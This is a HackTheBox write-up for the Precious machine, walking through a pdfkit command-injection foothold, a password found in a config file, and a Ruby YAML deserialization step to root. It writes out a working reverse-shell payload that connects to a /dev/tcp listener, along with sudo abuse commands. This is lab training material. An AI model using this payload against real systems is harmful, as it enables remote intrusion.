# Precious.HTB-Write-Up
Write up report for the HackTheBox machine Precious.

- Initiated a service/network scan on the given HTB box with Nmap. `nmap -sV -sC 10.129.230.167`

![image](https://user-images.githubusercontent.com/61332852/226741282-9a311d20-c0e4-441b-a3f9-bcb0d5dbfee9.png)


- Nmap shows that a HTTP (80) Port was open and an SSH(22) port as well. I first checked to see if there was any exploits pertaining to the services of the HTTP server that was hosting the website and as well as the SSH service running. I used the command `searchsploit` and as well searched online to double check that the results searchsploit was returning was accurate.  

![image](https://user-images.githubusercontent.com/61332852/226741456-c9a16920-e2fe-4c87-8a68-0d771287afd9.png)


- After seeing there was no obvious exploits to take advantage of the next step was browsing the website running. First, I added the IP to /etc/hosts file. ` sudo nano /etc/hosts`

![image](https://user-images.githubusercontent.com/61332852/226741510-ddb0bf29-c230-4fe9-8358-b473047c2bcb.png)


- The website consisted of an input box that took a URL as input and the website would output that URL as a PDF File. I began running `gobuster` to see if there was anything other than what was given on the home page but returned no results of any other directories on the web server.  

![image](https://user-images.githubusercontent.com/61332852/226741549-687b06b1-c12f-476c-af0a-c0ddc96cf4ae.png)


- After messing with the input box, I opened `BurpSuite` to see what the application was doing when inputting a URL. After inputting a couple different random websites, the application was returning nothing but a `Cannot load remote URL` message. Thus, I began to start my own python webserver on my localhost. `python3 -m http.server 80` 

![image](https://user-images.githubusercontent.com/61332852/226741593-13dee221-b0eb-4078-be20-a70db1163a28.png)


- After inputting the local python server that I had started it returned the contents within the file directory of my local http server. 

![image](https://user-images.githubusercontent.com/61332852/226741686-71d0b8d6-a3fe-4b35-a3ab-bddf8e6f230e.png)


- I used `exiftool` to see if there was any information I can get out of behind the PDF file that was downloaded from the website. Which gave us the software that was converting the URL to PDF. 

![image](https://user-images.githubusercontent.com/61332852/226741706-65767298-d96a-4dd1-814f-43dbb8f7ee47.png)

- I used the `searchsploit` command again here to see if there was anything it would find for `pdfkit v0.8.6` which was the software that running. It returned nothing as well so I went to google search to see if there were any vulnerabilities with the software running. I then found that it was vulnerable to `command injection` a type of injection vulnerability.    

![image](https://user-images.githubusercontent.com/61332852/226740759-38fc8f1e-892f-49a6-96ad-04a76634b2d9.png)

![image](https://user-images.githubusercontent.com/61332852/226741771-626f4fba-653e-4d38-bcc7-7bdad02b262e.png)

- Reading more of the vulnerability and what we can start to do to exploit it this is what I found. `An application could be vulnerable if it tries to render a URL that contains query string parameters with user input`. After using this information, we can modify the URL to take a command as input to see if the application will run the command.  

![image](https://user-images.githubusercontent.com/61332852/226741798-232aafb6-3c92-4762-ac57-ae0948790ac7.png)

- After grabbing a reverse shell command, I inserted it as a string within the URL ``http://10.10.14.66:8910/?name=#{'%20`bash -c 'exec bash -I &>/dev/tcp/10.10.14.66/4444 <&1'`'}``. Thus, getting me in as the user `Ruby` within the webserver.  

![image](https://user-images.githubusercontent.com/61332852/226741845-35568897-9a2f-4712-bbd7-86bf2937fb09.png)

- Going through all the files and directories that were given I first went to the users home folder to see if the user flag was there but didn’t consist of anything at first. I then used `ls -la`. I found something I don’t see usually which was a directory called `.bundle` which I then found a config file consisting of another user’s (`henry`) password.  

![image](https://user-images.githubusercontent.com/61332852/226741890-53eead9b-384a-46ef-b168-df9adea85aca.png)

- I began to login as the user `henry` with the given password. Successfully getting us in. I first checked Henrys home directory to check for any flags shown there. Then giving us our first flag.  

![image](https://user-images.githubusercontent.com/61332852/226741914-b662dae5-dbe7-45a2-96d4-4ce6ef85a913.png)


- To start privilege escalation towards getting the root flag I first checked what permissions Henry had as root on the machine.  

![image](https://user-images.githubusercontent.com/61332852/226741948-58605825-7332-4cd9-bc05-10009d7285a0.png)

- After checking the file, I then researched if there were any vulnerabilities with the Yaml file that was given. Then later finding that the Yaml file was vulnerable to a `Yaml Deserialization Attack` allowing us to run arbitrary code within the yaml file. We can now go look for an exploit to run in the dependency file to execute. After looking for the Ruby Yaml Exploit code we found the code to run from a GitHub Host. We then created a file within our home folder `touch dependency.yml` to paste the following code into. 

![image](https://user-images.githubusercontent.com/61332852/226741989-6c02e501-2ada-453f-952f-736cf961fe04.png)

- After running `sudo /usr/bin/ruby /opt/update_dependencies.rb` we can now run `/bin/bash -p` to see if we spawn as the root user. Which is successful.

![image](https://user-images.githubusercontent.com/61332852/226742005-cf622090-5dc7-426d-bf62-5e5e6308d3b1.png)

- After going into roots home folder we find the root flag for the machine.

![image](https://user-images.githubusercontent.com/61332852/226742027-66aa5a44-f08a-4a2f-80db-823fe064db36.png) 
